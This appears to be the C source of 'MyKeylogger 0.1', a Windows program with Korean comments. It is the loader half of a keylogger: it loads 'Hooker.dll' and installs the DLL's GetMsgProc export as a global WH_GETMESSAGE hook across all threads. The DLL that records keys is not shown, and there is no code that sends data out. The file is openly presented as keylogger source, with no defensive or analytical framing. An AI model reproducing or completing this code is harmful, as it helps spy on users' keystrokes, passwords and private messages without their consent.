/*******************************************************************
*
* MyKeylogger 0.1 (2012-08-01)
*
********************************************************************/

#include <windows.h>

LRESULT CALLBACK WndProc( HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam); 
HINSTANCE g_hInst;
LPSTR lpszClass="MyKeylogger";

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
				   LPSTR lpCmdLine, int nShowCmd) 
{
	HWND hWnd;
	MSG Message;
	WNDCLASS WndClass;
	g_hInst=hInstance;

	WndClass.cbClsExtra=0;
	WndClass.cbWndExtra=0;
	WndClass.hbrBackground=(HBRUSH)GetStockObject(WHITE_BRUSH);
	WndClass.hCursor=LoadCursor(NULL,IDC_ARROW);
	WndClass.hIcon=LoadIcon(NULL,IDI_APPLICATION);
	WndClass.hInstance=hInstance;
	WndClass.lpfnWndProc=(WNDPROC)WndProc;
	WndClass.lpszClassName=lpszClass;
	WndClass.lpszMenuName=NULL;
	WndClass.style=CS_HREDRAW | CS_VREDRAW;
	RegisterClass( &WndClass ); 

	hWnd=CreateWindow(lpszClass,lpszClass,WS_OVERLAPPEDWINDOW,
		  CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,
		  NULL,(HMENU)NULL,hInstance,NULL);     
	ShowWindow(hWnd, nShowCmd); 

	while( GetMessage( &Message, NULL, 0, 0 ) ) {
		TranslateMessage( &Message ); 
		DispatchMessage( &Message ); 
	}

	return Message.wParam;
}

LRESULT CALLBACK WndProc( HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam) 
{   
	static HINSTANCE hinstDll;	// LoadLibrary() 리턴값 저장
	HOOKPROC hGetMsgProc;		// GetProcAddress(,) 리턴값 저장
	static HHOOK hKeyHook;		// SetWindowsHookEx(,,,) 리턴값 저장

    switch( iMessage ) 
    { 
	case WM_CREATE:		// 윈도우 생성시 후킹 설정: 실제 후킹은 연결된 dll에서 수행
		// 1. dll loaging
		hinstDll = LoadLibrary("Hooker.dll"); // DLL을 로드한다.
        if(!hinstDll){
			MessageBox(hWnd, "Hooker.dll을 로드할 수 없습니다.", "오류", MB_OK);
			ExitProcess(1);
        }

		// 2. get pointer of function
        hGetMsgProc = (HOOKPROC)GetProcAddress(hinstDll, "GetMsgProc");          
        if(!hGetMsgProc){
            MessageBox(hWnd, "hGetMsgProc 함수를 로드할 수 없습니다.", "오류", MB_OK);
            FreeLibrary(hinstDll);
            ExitProcess(1);
        }

		// 3. set hooking
		hKeyHook = SetWindowsHookEx(WH_GETMESSAGE, hGetMsgProc, hinstDll, 0);
		// 모든 메세지에 대해 hinstDll의 hGetMsgProc실행
		if(!hKeyHook){
            MessageBox(hWnd, "Hooking을 성공하지 못했습니다.", "오류", MB_OK);
            FreeLibrary(hinstDll);
            ExitProcess(1);
        }
        break;
	case WM_DESTROY: 
		PostQuitMessage( 0 );             
    } 

    return DefWindowProc( hWnd, iMessage, wParam, lParam ); 
} 
